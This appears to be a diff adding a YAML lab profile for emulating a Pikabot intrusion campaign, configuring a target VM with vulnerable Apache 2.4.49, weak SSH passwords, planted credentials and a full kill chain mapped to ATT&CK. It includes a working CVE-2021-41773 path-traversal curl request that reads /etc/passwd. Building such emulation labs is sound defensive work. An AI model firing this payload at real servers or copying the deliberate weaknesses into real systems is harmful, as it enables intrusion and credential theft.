@@ -1,0 +1,122 @@
+# =============================================================================
+# SUT Profile: 0.pikabot_realistic (Pikabot with Real Vulnerabilities)
+# =============================================================================
+# Description: Pikabot distribution campaign with realistic execution environment
+# Fidelity: ADAPTED for Linux techniques, real exploitation for Initial Access
+# Infrastructure: 3 VMs with Apache CVE-2021-41773
+# =============================================================================
+
+campaign_id: "0.pikabot_realistic"
+description: "Pikabot Distribution February 2024 - Realistic Execution with CVE"
+
+requirements:
+  min_hosts: 3
+  required_vms: ["caldera", "attacker", "target-base"]
+  estimated_duration_minutes: 8
+
+sut_configuration:
+  target-base:
+    os: "ubuntu-2004"  # Focal for better CVE-2021-41773 compatibility
+
+    services:
+      - name: "apache2"
+        version: "2.4.49"
+        config: "vulnerable-cve-2021-41773"
+        cgi_enabled: true
+
+      - name: "ssh"
+        version: "default"
+        config: "password_auth_enabled"
+
+    users:
+      - username: "vulnuser"
+        password: "vulnpass123"
+        sudo: false
+
+      - username: "webadmin"
+        password: "webadmin123"
+        sudo: true  # For privilege escalation testing
+
+    files:
+      # Sensitive files to exfiltrate
+      - path: "/home/webadmin/secrets/credentials.db"
+        content: |
+          user:admin:AdminPass123!
+          db:root:RootDB456
+          api:service:ApiKey789XYZ
+        owner: "webadmin"
+        permissions: "600"
+
+      # Web content
+      - path: "/var/www/html/index.html"
+        content: |
+          <html><body>
+          <h1>Internal Company Portal</h1>
+          <p>Authorized personnel only</p>
+          </body></html>
+        owner: "www-data"
+        permissions: "644"
+
+      # CGI script (vulnerable to path traversal)
+      - path: "/usr/lib/cgi-bin/status.cgi"
+        content: |
+          #!/bin/bash
+          echo "Content-type: text/plain"
+          echo ""
+          echo "Server Status: $(date)"
+          echo "Hostname: $(hostname)"
+          echo "Load: $(uptime)"
+        owner: "www-data"
+        permissions: "755"
+
+    network:
+      ingress: [22, 80, 443]
+      egress: ["*"]
+
+    deliberate_weaknesses:
+      - type: "cve-2021-41773"
+        description: "Apache 2.4.49 path traversal - T1190 Exploit Public-Facing Application"
+        impact: "Arbitrary file read, potential RCE via CGI"
+
+      - type: "weak_ssh_password"
+        description: "T1078.001 - Valid Accounts with weak credentials"
+
+      - type: "world_writable_suid"
+        description: "T1548 - Abuse Elevation Control Mechanism"
+
+fidelity_expectations:
+  T1190: "ADAPTED"          # Exploit real Apache vulnerability
+  T1078.001: "ADAPTED"      # Real SSH with weak creds
+  T1059.003: "ADAPTED"      # Real shell execution via SSH
+  T1083: "ADAPTED"          # Real file discovery
+  T1560.001: "ADAPTED"      # Real archive creation
+  T1041: "ADAPTED"          # Real HTTP exfiltration
+  T1566.002: "INSPIRED"     # Spearphishing Link (no email delivery)
+  T1059.007: "INSPIRED"     # JavaScript WScript (Windows)
+  T1059.001: "INSPIRED"     # PowerShell (Windows - not executed)
+  T1059.005: "INSPIRED"     # VBScript (Windows - not executed)
+  T1574: "INSPIRED"        # DLL Hijack (Windows)
+
+exploit_verification:
+  cve_2021_41773_test: |
+    curl 'http://192.168.56.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
+
+  expected_result: |
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+methodology_notes: |
+  This profile creates a realistic vulnerable environment for testing
+  actual exploitation and post-exploitation techniques. The Apache
+  CVE-2021-41773 provides a real initial access vector that can be
+  exploited via path traversal to read arbitrary files or execute
+  commands via CGI.
+
+  The campaign demonstrates full kill chain:
+  1. Initial Access (T1190 - Apache exploit)
+  2. Execution (T1059.003 - Shell via SSH)
+  3. Discovery (T1083 - File enumeration)
+  4. Collection (T1560.001 - Archive)
+  5. Exfiltration (T1041 - HTTP POST)
+
+execution_mode: "real_controlled"
